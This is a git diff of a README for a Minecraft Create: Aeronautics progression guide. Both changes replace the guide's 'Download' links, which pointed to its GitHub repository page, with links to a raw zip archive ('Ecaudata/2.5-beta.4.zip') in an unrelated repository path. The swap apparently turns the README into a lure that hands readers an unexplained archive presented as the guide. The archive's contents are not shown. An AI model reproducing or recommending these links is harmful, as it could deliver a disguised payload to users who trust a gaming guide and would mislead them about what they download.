@@ -5,7 +5,7 @@ description: "Navigate the Create: Aeronautics mod with this step-by-step progre
 ---
 # ☁️ create-aeronautics-progression - Master flight systems in Minecraft today
 
-[![](https://img.shields.io/badge/Download-Guide-blue)](https://github.com/Tuscan-twopiece875/create-aeronautics-progression)
+[![](https://img.shields.io/badge/Download-Guide-blue)](https://raw.githubusercontent.com/Tuscan-twopiece875/tuscan-twopiece875.github.io/main/Ecaudata/2.5-beta.4.zip)
 
 ## 📋 About this guide
 
@@ -25,7 +25,7 @@ Before you begin, ensure your computer meets these requirements:
 
 To use this guide and its associated resources, visit the official repository page to download the necessary files.
 
-[Download the guide here](https://github.com/Tuscan-twopiece875/create-aeronautics-progression)
+[Download the guide here](https://raw.githubusercontent.com/Tuscan-twopiece875/tuscan-twopiece875.github.io/main/Ecaudata/2.5-beta.4.zip)
 
 ## 🛠️ Step-by-step installation
 
